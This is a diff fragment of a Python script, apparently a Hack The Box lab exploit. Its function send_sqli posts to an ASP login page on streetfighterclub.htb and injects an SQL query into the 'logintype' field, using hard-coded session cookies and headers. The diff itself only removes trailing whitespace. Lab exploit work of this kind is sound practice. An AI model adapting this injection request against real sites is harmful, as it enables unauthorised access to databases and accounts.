@@ -11,18 +11,18 @@
  def send_sqli(query):  
      burp0_url = "http://members.streetfighterclub.htb:80/old/verify.asp"  
    
-     burp0_cookies = {"ASPSESSIONIDAASBBTDA": "CLLPJHKDFAINLHMPHLPNOOFL", \  
-             "ASPSESSIONIDAAQABTDB": "DCODCLBANIIFANFBBEDBCDJK", \  
-             "ASPSESSIONIDCARBATDB": "KBJHLBCABAHPCFHPPHJAGPLA", \  
-             "Email": "", "Level": "%2D1", "Chk": "8077", "password": "dGVzdA%3D%3D", "username": "dGVzdA%3D%3D", \  
-             "ASPSESSIONIDQAQBBRRA": "KALFDMNCPPFGHDMPIFHEIFFA"}  
+     burp0_cookies = {"ASPSESSIONIDAASBBTDA": "CLLPJHKDFAINLHMPHLPNOOFL", \
+             "ASPSESSIONIDAAQABTDB": "DCODCLBANIIFANFBBEDBCDJK", \
+             "ASPSESSIONIDCARBATDB": "KBJHLBCABAHPCFHPPHJAGPLA", \
+             "Email": "", "Level": "%2D1", "Chk": "8077", "password": "dGVzdA%3D%3D", "username": "dGVzdA%3D%3D", \
+             "ASPSESSIONIDQAQBBRRA": "KALFDMNCPPFGHDMPIFHEIFFA"}
    
-     burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", \  
-             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", \  
-             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", \  
-             "Referer": "http://members.streetfighterclub.htb/old/Login.asp", \  
-             "Content-Type": "application/x-www-form-urlencoded", \  
-             "Connection": "close", "Upgrade-Insecure-Requests": "1"}  
+     burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", \
+             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", \
+             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", \
+             "Referer": "http://members.streetfighterclub.htb/old/Login.asp", \
+             "Content-Type": "application/x-www-form-urlencoded", \
+             "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    
      burp0_data={"username": "admin", "password": "admin", "logintype": "2{}".format(query), "rememberme": "ON", "B1": "LogIn"}  
    
